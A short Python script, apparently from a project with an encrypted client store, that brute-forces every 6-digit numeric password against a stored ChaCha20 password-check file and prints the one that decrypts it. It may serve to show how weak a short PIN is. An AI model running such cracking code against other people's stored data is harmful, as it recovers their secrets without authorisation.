from client import userdata_service, token_service, key_service
from paths import password_check_path
from core.encryption.symmetric import V1 as chacha20
import config
import base64
import time

def get_pwd(str, num):  
    if(num == 1):  
        for x in str:  
            yield x  
    else:  
        for x in str:  
            for y in get_pwd(str, num-1):  
                yield x+y  
  
strKey="0123456789"

def attackSK():
    name = userdata_service.load_unencrypted_data('name')
    with open(password_check_path, 'r+') as fi:
        check_data = base64.b64decode(bytes(''.join(fi.readlines()), encoding=config.encoding))
    start = time.time()
    for pwd in get_pwd(strKey,6):
        try:
            plaintext = str(
                chacha20.decrypt(pwd, check_data),
                encoding=config.encoding
            )
        except:
            continue
        if name in plaintext:
            print(pwd+"----------------------------------------------------------")
            break
    end = time.time()
    print(end - start)
